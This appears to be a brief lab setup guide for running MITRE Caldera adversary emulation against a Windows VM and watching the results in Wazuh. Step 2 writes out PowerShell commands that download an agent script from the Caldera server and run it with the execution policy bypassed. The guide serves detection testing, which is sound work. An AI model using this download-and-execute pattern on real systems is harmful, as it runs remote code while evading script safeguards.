# Setup Guide

## Step 1: Start MITRE Caldera
cd caldera
python server.py --insecure

## Step 2: Deploy Agent
Run agent command on Windows VM:
Invoke-WebRequest -Uri http://<caldera-ip>:8888/file/download -OutFile agent.ps1
powershell -ExecutionPolicy Bypass -File agent.ps1

## Step 3: Execute Attack
- Login to Caldera UI
- Select adversary profile
- Run operation

## Step 4: Monitor Wazuh
- Open Wazuh Dashboard
- Go to Security Events
- Filter logs for:
  - PowerShell
  - Suspicious URLs
